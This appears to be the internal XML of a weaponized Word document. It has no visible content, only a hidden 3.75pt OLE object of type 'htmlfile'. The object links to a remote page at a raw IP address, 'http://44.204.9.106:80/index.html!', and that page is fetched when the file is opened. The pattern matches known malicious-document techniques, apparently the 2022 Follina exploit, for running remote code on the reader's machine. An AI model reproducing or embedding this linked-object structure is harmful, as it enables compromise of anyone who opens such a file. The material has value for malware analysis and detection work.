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object w:dxaOrig="4320" w:dyaOrig="4320" w14:anchorId="0457A93C"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3.75pt;height:3.75pt" o:ole="">
	</v:shape>
      <o:OLEObject Type="Link" ProgID="htmlfile" ShapeID="_x0000_i1025" DrawAspect="Content" r:id="rId5" UpdateMode="OnCall">
        <o:LinkType>EnhancedMetaFile</o:LinkType>
        <o:LockedField>false</o:LockedField>
        <o:FieldCodes>\f 0</o:FieldCodes>
      </o:OLEObject>
    </w:object>
    <w:p w14:paraId="15AEA9D4" w14:textId="6B56B84E" w:rsidR="00DA49F2" w:rsidRPr="00EE2BC3" w:rsidRDefault="00DA49F2" w:rsidP="00EE2BC3">
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:sectPr w:rsidR="00DA49F2" w:rsidRPr="00EE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45A"/>
    <w:rsid w:val="00B5245A"/>
    <w:rsid w:val="00DA49F2"/>
    <w:rsid w:val="00EE2BC3"/>
    <w:rsid w:val="00F4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E7F"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{B14D40A3-F756-47A2-BC78-3C2C7C327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oleObject" Target="http://44.204.9.106:80/index.html!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KIS2</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>KIS2</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-05-25T13:14:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-05-25T13:14:00Z</dcterms:modified>
</cp:coreProperties>
</file>